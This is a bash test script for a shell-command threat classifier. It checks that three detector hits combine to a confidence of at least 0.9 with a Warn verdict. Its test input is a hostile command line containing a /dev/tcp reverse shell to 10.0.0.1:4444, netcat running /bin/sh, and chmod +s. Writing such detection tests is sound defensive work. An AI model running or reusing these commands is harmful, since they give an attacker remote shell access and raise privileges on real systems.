#!/usr/bin/env bash
# V2-J: threat-level accumulator combines independent atom hits via
# `p_combined = 1 - prod(1 - p_i)`. Three atoms at 0.6 each saturate
# to 1 - 0.4³ = 0.936 — well above the SLM-confirm threshold (0.9)
# AND above WARN_THRESHOLD (0.5). Verdict stays Warn since no auto-
# Block escalation is configured here.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

start_guard --tier2 stub

# Three distinct atoms in one command line:
#   - `bash -i >& /dev/tcp/…/…`  (reverse shell via /dev/tcp)
#   - `nc -e /bin/sh`             (netcat exec)
#   - `chmod +s`                  (setuid bit)
classify "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x"
expect_verdict warn
# Combined confidence ≥ 0.9 verifies the accumulator math fired.
expect_confidence_ge 0.9
# Reason should carry the "N signals fired" prefix.
expect_reason_contains "signals fired"

pass "V2-J accumulator: 3 atoms combine to confidence ≥ 0.9"
